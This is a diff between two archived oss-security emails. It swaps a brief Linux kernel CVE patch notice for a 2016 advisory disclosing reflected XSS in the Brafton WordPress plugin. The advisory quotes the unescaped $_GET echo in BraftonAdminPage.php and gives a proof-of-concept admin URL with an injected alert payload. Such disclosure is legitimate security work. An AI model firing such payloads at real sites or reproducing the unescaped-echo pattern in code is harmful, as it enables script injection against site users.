@@ -1,17 +1,69 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/16/3
-Message-ID: <1285487368.13047975.1479285134573.JavaMail.zimbra@redhat.com>
-Date: Wed, 16 Nov 2016 03:32:14 -0500 (EST)
-From: Vladis Dronov <vdronov@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/20/5
+Message-ID: <CAC3DZsRDzjmsO0ui_OEhb5SktYu=KBWinUFadFw4QOsL3ofBAQ@mail.gmail.com>
+Date: Fri, 20 May 2016 10:00:37 -0400
+From: Mehrdad Linux <mehrdadlinux@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2016-8645: linux kernel: net: a BUG() statement can be hit in net/ipv4/tcp_input.c
+Subject: CVE Request -Vulnerabilitie XSS in brafton WordPress Plugin
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Title -brafton WordPress Plugin XSS
 
-A patch was developed by Eric Dumazet and accepted in the upstream:
+# Exploit Title :  Vulnerabilitie XSS in brafton WordPress Plugin
+# Date: Fri May 20  2016
+# Reported Date : Fri May 20  2016
+# Vendor Homepage: http://www.brafton.com/support/wordpress/
+# Version: v3.3.10 – January2016
+# Software Link:
+https://github.com/ContentLEAD/BraftonWordpressPlugin/archive/master.zip
+# Exploit Author :MehrdadLinux
+# Tested On : Linux Platforms.
+# Fix/Patching : Update To
+# Facebook : https://facebook.com/MehrdadLinux
+# Twitter : http://twitter.com/MehrdadLinux
+# Detailed Vul: http://blog.opsnit.com
+===========================================================================================
 
-https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ac6e780070e30e4c35bd395acfe9191e6268bdd3
+1. VULNERABILITY
+-------------------------
 
-Best regards,
-Vladis Dronov | Red Hat, Inc. | Product Security Engineer
+brafton WordPress Plugin  v3.3.10 – January2016
+
+
+2. BACKGROUND
+-------------------------
+this is WordPress Plugin  for Brafton
+
+Brafton is a content marketing agency.
+Our in-house teams develop and execute SEO-optimized content strategies,
+from news to infographics
+
+
+3. DESCRIPTION
+-------------------------
+XSS in BraftonAdminPage.php
+
+in line 11 :
+    tab = <?php if(isset($_GET['tab'])){ echo $_GET['tab'];} else{ echo
+0;}?>;
+
+wordpress/wp-admin/admin.php?page=BraftonArticleLoader&tab=alert(String.fromCharCode(77,101,104,114,100,97,100,76,105,110,117,120,32,88,83,83))
+
+
+4. discovered by :
+-------------------------
+
+The vulnerability has been discovered by Mehrdad Abbasi(MehrdadLinux) and
+Hossein Masoudi (cs.masoudi)
+email : MehrdadLinux (at) gmail (dot) com
+http://opsnit.com
+
+
+5 .LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this
+information.
+
